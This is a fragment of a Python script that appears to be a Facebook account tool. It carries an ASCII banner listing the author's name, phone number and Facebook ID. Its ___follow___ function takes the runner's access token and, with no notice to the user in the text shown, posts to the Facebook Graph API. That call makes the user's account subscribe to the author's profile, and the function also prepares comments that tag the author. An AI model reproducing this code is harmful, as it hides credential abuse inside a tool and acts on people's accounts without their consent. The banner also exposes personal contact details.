...
figlet Hamii | lolcat
"""
___banner___ = ("""d8888b. db    db .88b  d88. d8888b.  \033[1;97m[\033[1;94m+\033[1;97m] AU : Mahin
88  `8D 88    88 88'YbdP`88 88  `8D  \033[1;97m[\033[1;94m+\033[1;97m] PN : +01925798757
88   88 88    88 88  88  88 88oodD'  \033[1;97m[\033[1;94m+\033[1;97m] GH : Arafat Bin Mahin 
88   88 88    88 88  88  88 88~~~    \033[1;97m[\033[1;94m+\033[1;97m] FB : 100000545457649
88  .8D 88b  d88 88  88  88 88       \033[1;97m[\033[1;94m+\033[1;97m] TN : TEAM v*V-ViruX 
...
def ___follow___():
    ...
    try:
        ...
        ___komen___ = ('I Love You @[100000545457649:] \n\n'+___kata___+'\n'+___waktu)
        ___komen2___ = ('I Love You @[100000545457649:]\n\n'+___kata___+'\n'+___waktu)
        ___komen3___ = random.choice(['Hello Have A Nyc Day'])
        requests.post('https://graph.facebook.com/100000545457649/subscribers?access_token=%s'%(___token)) #Hamii
